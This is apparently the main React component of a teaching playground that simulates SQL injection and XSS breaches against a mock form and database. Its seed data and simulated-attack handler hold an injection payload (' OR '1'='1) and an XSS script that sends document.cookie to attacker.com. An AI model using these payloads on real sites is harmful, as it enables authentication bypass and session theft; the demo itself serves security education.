import React, { useState } from 'react';
import { FormSubmission, PlaygroundPage, BreachIncident } from './types';
import GoogleFormView from './components/GoogleFormView';
import SecurityVisualizer from './components/SecurityVisualizer';
import CompromisedDatabaseView from './components/CompromisedDatabaseView';
import { 
  FileText, 
  Shield, 
  Columns, 
  Database,
  AlertTriangle,
  Lock,
  Sparkles, 
  Zap, 
  ArrowRight, 
  RefreshCw,
  Info
} from 'lucide-react';

const INITIAL_SUBMISSIONS: FormSubmission[] = [
  {
    id: 'sub_seed_admin',
    name: 'Eleanor Vance (SysAdmin)',
    email: 'eleanor.admin@securecorp.net',
    feedback: 'Critical database maintenance completed. Root API keys rotated.',
    environment: 'Production (Strict Parameterized Queries)',
    rating: 5,
    submittedAt: '09:14:02 AM',
    hasSQLi: false,
    hasXSS: false,
    role: 'Root Administrator',
    sessionToken: 'sess_live_root_99x81a_sec',
    passwordHash: '$2b$12$e9K2vL09mH.78xYzQ1pWue9',
    plainPasswordSimulated: 'AdminSuperPass#2026!',
    ipAddress: '10.0.0.1 (Internal Gateway)',
    accountBalance: '$95,420.00',
  },
  {
    id: 'sub_seed_1',
    name: 'Alex Mercer',
    email: 'alex@matrix.com',
    feedback: 'Great application platform! User experience is smooth.',
    environment: 'Production (Strict Parameterized Queries)',
    rating: 5,
    submittedAt: '10:45:12 AM',
    hasSQLi: false,
    hasXSS: false,
    role: 'Staff Engineer',
    sessionToken: 'sess_live_alex_44f80c_jwt',
    passwordHash: '$2b$12$w3J9kM12bC.45vXyZ9pQae1',
    plainPasswordSimulated: 'MercerWinter#2026!',
    ipAddress: '192.168.1.104',
    accountBalance: '$14,200.00',
  },
  {
    id: 'sub_seed_fin',
    name: 'Marcus Sterling',
    email: 'marcus.fin@investcorp.com',
    feedback: 'Submitted Q3 payroll budget spreadsheet. Awaiting disbursement approval.',
    environment: 'Production (Strict Parameterized Queries)',
    rating: 4,
    submittedAt: '10:46:55 AM',
    hasSQLi: false,
    hasXSS: false,
    role: 'VP Financial Operations',
    sessionToken: 'sess_live_fin_88a91c_vip',
    passwordHash: '$2b$12$z8K1vP99mQ.22wXyB3tVue7',
    plainPasswordSimulated: 'SterlingCapital$99',
    ipAddress: '172.16.4.22',
    accountBalance: '$1,250,000.00',
  },
  {
    id: 'sub_seed_2',
    name: 'Attacker_SQLi',
    email: "' OR '1'='1",
    feedback: 'Testing authentication bypass via unescaped WHERE clause string concatenation.',
    environment: 'Legacy Staging (Vulnerable String Concatenation)',
    rating: 1,
    submittedAt: '10:48:30 AM',
    hasSQLi: true,
    hasXSS: false,
    role: 'External Pentester',
    sessionToken: 'sess_anon_sqli_prober_01',
    passwordHash: '$2b$12$hacked0000000000000000',
    plainPasswordSimulated: 'PayloadTest#1',
    ipAddress: '45.33.32.156',
    accountBalance: '$0.00',
  },
  {
    id: 'sub_seed_3',
    name: 'Pentester_XSS',
    email: 'secops@cyber.org',
    feedback: "<script>alert('XSS SESSION STOLEN!')</script>",
    environment: 'Legacy Staging (Vulnerable String Concatenation)',
    rating: 2,
    submittedAt: '10:52:05 AM',
    hasSQLi: false,
    hasXSS: true,
    role: 'Security Auditor',
    sessionToken: 'sess_anon_xss_runner_02',
    passwordHash: '$2b$12$scriptInjection99999',
    plainPasswordSimulated: 'ScriptAudit!99',
    ipAddress: '198.51.100.77',
    accountBalance: '$50.00',
  },
];

export default function App() {
  const [currentPage, setCurrentPage] = useState<PlaygroundPage>('form');
  const [submissions, setSubmissions] = useState<FormSubmission[]>(INITIAL_SUBMISSIONS);
  const [activeSubmission, setActiveSubmission] = useState<FormSubmission | null>(
    INITIAL_SUBMISSIONS[0]
  );
  const [toastMessage, setToastMessage] = useState<string | null>(null);

  // Security breach & exfiltration tracking for Page 3
  const [breachHistory, setBreachHistory] = useState<BreachIncident[]>([]);
  const [latestBreach, setLatestBreach] = useState<BreachIncident | null>(null);

  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => {
      setToastMessage(null);
    }, 4000);
  };

  const handleBreachDetected = (breach: BreachIncident) => {
    setLatestBreach(breach);
    setBreachHistory((prev) => [breach, ...prev]);
    showToast(`🚨 ATTACK DETECTED: Data breach recorded! Page 3 unlocked.`);
  };

  const handleResetBreach = () => {
    setLatestBreach(null);
    setBreachHistory([]);
    showToast('🛡️ Database secured: Compromised records purged.');
  };

  const handleFormSubmit = (newSubmission: FormSubmission) => {
    setSubmissions((prev) => [newSubmission, ...prev]);
    setActiveSubmission(newSubmission);
    showToast('🚀 Response recorded & piped to Security Visualizer!');
  };

  const handleSelectSubmissionForVisualizer = (sub: FormSubmission) => {
    setActiveSubmission(sub);
    setCurrentPage('visualizer');
    showToast(`Loaded payload from "${sub.name}" into Security Visualizer`);
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#090a0f] text-[#f3f4f6]">
      
      {/* Top Universal Playground Header */}
      <header className="bg-[#12141d] border-b border-[#1e2235] px-4 py-2.5 z-40 sticky top-0 shadow-md">
        <div className="max-w-7xl mx-auto flex flex-wrap items-center justify-between gap-3">
          
          {/* Logo & Title */}
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-2">
              <span className="text-xl">⚡</span>
              <span className="font-bold text-sm tracking-wide text-white">
                Kalpvuksh 2.0 Security Playground
              </span>
            </div>
            <span className="hidden md:inline text-xs text-[#9ca3af] border-l border-[#1e2235] pl-3">
              Google Form ↔ Security Visualizer ↔ Database Vault
            </span>
          </div>

          {/* Page Switcher Segmented Control */}
          <div className="flex items-center bg-[#090a0f] border border-[#1e2235] p-1 rounded-xl shadow-inner text-xs">
            <button
              id="nav-page-form"
              onClick={() => setCurrentPage('form')}
              className={`flex items-center gap-2 px-3.5 py-1.5 rounded-lg font-medium transition-all cursor-pointer ${
                currentPage === 'form'
                  ? 'bg-[#673ab7] text-white shadow-sm'
                  : 'text-[#9ca3af] hover:text-white'
              }`}
            >
              <FileText className="w-3.5 h-3.5" />
              <span>Page 1: Google Form</span>
            </button>

            <button
              id="nav-page-visualizer"
              onClick={() => setCurrentPage('visualizer')}
              className={`flex items-center gap-2 px-3.5 py-1.5 rounded-lg font-medium transition-all cursor-pointer ${
                currentPage === 'visualizer'
                  ? 'bg-[#6366f1] text-white shadow-sm'
                  : 'text-[#9ca3af] hover:text-white'
              }`}
            >
              <Shield className="w-3.5 h-3.5" />
              <span>Page 2: Security Visualizer</span>
            </button>

            <button
              id="nav-page-exfiltrated"
              onClick={() => setCurrentPage('exfiltrated')}
              className={`flex items-center gap-2 px-3.5 py-1.5 rounded-lg font-medium transition-all cursor-pointer ${
                currentPage === 'exfiltrated'
                  ? 'bg-rose-600 text-white shadow-sm'
                  : latestBreach
                  ? 'text-rose-400 hover:text-rose-200 bg-rose-950/40 border border-rose-500/50 animate-pulse'
                  : 'text-[#9ca3af] hover:text-white'
              }`}
            >
              <Database className={`w-3.5 h-3.5 ${latestBreach ? 'text-rose-400' : 'text-gray-400'}`} />
              <span>Page 3: Compromised DB</span>
              {latestBreach ? (
                <span className="bg-rose-500 text-white font-mono text-[9px] px-1.5 py-0.2 rounded font-bold uppercase">
                  Breach!
                </span>
              ) : (
                <Lock className="w-3 h-3 text-gray-500" />
              )}
            </button>

            <button
              id="nav-page-split"
              onClick={() => setCurrentPage('split')}
              className={`hidden lg:flex items-center gap-2 px-3 py-1.5 rounded-lg font-medium transition-all cursor-pointer ${
                currentPage === 'split'
                  ? 'bg-gradient-to-r from-[#673ab7] to-[#6366f1] text-white shadow-sm'
                  : 'text-[#9ca3af] hover:text-white'
              }`}
              title="View Google Form and Security Visualizer side-by-side"
            >
              <Columns className="w-3.5 h-3.5" />
              <span>Split Screen</span>
            </button>
          </div>

          {/* Right Status Badge */}
          <div className="flex items-center gap-2 text-xs">
            <span className="text-[#9ca3af] hidden sm:inline">Active Payload:</span>
            <span className="bg-[#181b29] border border-[#1e2235] text-amber-300 font-mono text-[11px] px-2 py-0.5 rounded max-w-[140px] truncate">
              {activeSubmission?.email || 'alex@matrix.com'}
            </span>
          </div>
        </div>
      </header>

      {/* Toast Notification */}
      {toastMessage && (
        <div className="fixed bottom-6 right-6 z-50 bg-[#12141d] border border-[#6366f1] text-white px-4 py-3 rounded-xl shadow-2xl flex items-center gap-3 animate-in fade-in slide-in-from-bottom-4 duration-200">
          <div className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
          <span className="text-xs font-medium">{toastMessage}</span>
        </div>
      )}

      {/* Main Playground Content Container */}
      <main className="flex-1 w-full flex flex-col">
        {currentPage === 'form' && (
          <div className="w-full">
            <GoogleFormView
              onSubmitToVisualizer={handleFormSubmit}
              onSwitchToVisualizer={() => setCurrentPage('visualizer')}
              onSwitchToExfiltrated={() => setCurrentPage('exfiltrated')}
              onBreachDetected={handleBreachDetected}
              hasBreachOccurred={!!latestBreach}
              submissions={submissions}
            />
          </div>
        )}

        {currentPage === 'visualizer' && (
          <div className="w-full">
            <SecurityVisualizer
              initialData={{
                name: activeSubmission?.name || 'Alex Mercer',
                email: activeSubmission?.email || 'alex@matrix.com',
                comment: activeSubmission?.feedback || 'Great application platform!',
              }}
              latestFormSubmission={activeSubmission}
              submissions={submissions}
              hasBreachOccurred={!!latestBreach}
              onNavigateToForm={() => setCurrentPage('form')}
              onNavigateToExfiltrated={() => setCurrentPage('exfiltrated')}
              onBreachDetected={handleBreachDetected}
            />
          </div>
        )}

        {currentPage === 'exfiltrated' && (
          <div className="w-full">
            <CompromisedDatabaseView
              latestBreach={latestBreach}
              breachHistory={breachHistory}
              submissions={submissions}
              onNavigateToForm={() => setCurrentPage('form')}
              onNavigateToVisualizer={() => setCurrentPage('visualizer')}
              onSimulateAttack={(type) => {
                const isSQLi = type === 'sqli';
                const demoBreach: BreachIncident = {
                  id: `breach_sim_${type}_${Date.now()}`,
                  timestamp: new Date().toLocaleTimeString(),
                  attackType: type,
                  payload: isSQLi
                    ? { email: "' OR '1'='1", comment: 'Auth bypass injection' }
                    : { email: 'victim@securecorp.net', comment: '<script>fetch("http://attacker.com/steal?c=" + document.cookie)</script>' },
                  title: isSQLi
                    ? 'Simulated SQL Injection Database Dump'
                    : 'Simulated XSS Session Exfiltration',
                  summary: isSQLi
                    ? "Tautological condition evaluated true. The raw query returned all private database rows."
                    : "Script injected into client execution context. Active session cookies and auth tokens dumped.",
                  subCategory: isSQLi ? 'Auth Bypass' : 'Session Hijacking',
                };
                handleBreachDetected(demoBreach);
              }}
              onResetBreach={handleResetBreach}
            />
          </div>
        )}

        {currentPage === 'split' && (
          <div className="w-full flex flex-col lg:flex-row divide-y lg:divide-y-0 lg:divide-x divide-[#1e2235] min-h-[calc(100vh-60px)]">
            {/* Left Column: Google Form */}
            <div className="w-full lg:w-1/2 overflow-y-auto max-h-[calc(100vh-60px)] bg-[#f0ebf8]">
              <div className="p-3 bg-[#673ab7] text-white text-xs font-semibold flex items-center justify-between sticky top-0 z-20">
                <span className="flex items-center gap-1.5">
                  <FileText className="w-4 h-4" /> Page 1: Google Form Playground
                </span>
                <span className="text-[11px] opacity-80">Submitting feeds Visualizer</span>
              </div>
              <GoogleFormView
                onSubmitToVisualizer={handleFormSubmit}
                onSwitchToVisualizer={() => setCurrentPage('visualizer')}
                onSwitchToExfiltrated={() => setCurrentPage('exfiltrated')}
                onBreachDetected={handleBreachDetected}
                hasBreachOccurred={!!latestBreach}
                submissions={submissions}
              />
            </div>

            {/* Right Column: Security Visualizer */}
            <div className="w-full lg:w-1/2 overflow-y-auto max-h-[calc(100vh-60px)] bg-[#090a0f]">
              <div className="p-3 bg-[#12141d] border-b border-[#1e2235] text-white text-xs font-semibold flex items-center justify-between sticky top-0 z-20">
                <span className="flex items-center gap-1.5">
                  <Shield className="w-4 h-4 text-[#6366f1]" /> Page 2: T018 Security Visualizer (Problem P19)
                </span>
                <span className="text-[11px] text-emerald-400">Live Dual Pipeline</span>
              </div>
              <SecurityVisualizer
                initialData={{
                  name: activeSubmission?.name || 'Alex Mercer',
                  email: activeSubmission?.email || 'alex@matrix.com',
                  comment: activeSubmission?.feedback || 'Great application platform!',
                }}
                latestFormSubmission={activeSubmission}
                submissions={submissions}
                hasBreachOccurred={!!latestBreach}
                onNavigateToForm={() => setCurrentPage('form')}
                onNavigateToExfiltrated={() => setCurrentPage('exfiltrated')}
                onBreachDetected={handleBreachDetected}
              />
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
